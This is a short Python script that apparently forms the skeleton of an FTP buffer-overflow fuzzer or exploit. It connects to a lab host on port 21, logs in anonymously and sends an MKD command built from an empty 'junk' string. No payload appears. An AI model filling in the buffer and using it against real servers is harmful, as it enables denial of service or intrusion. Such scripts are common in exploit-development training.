#!/usr/bin/python
import socket
import sys

junk =''

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD' + junk +'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close()
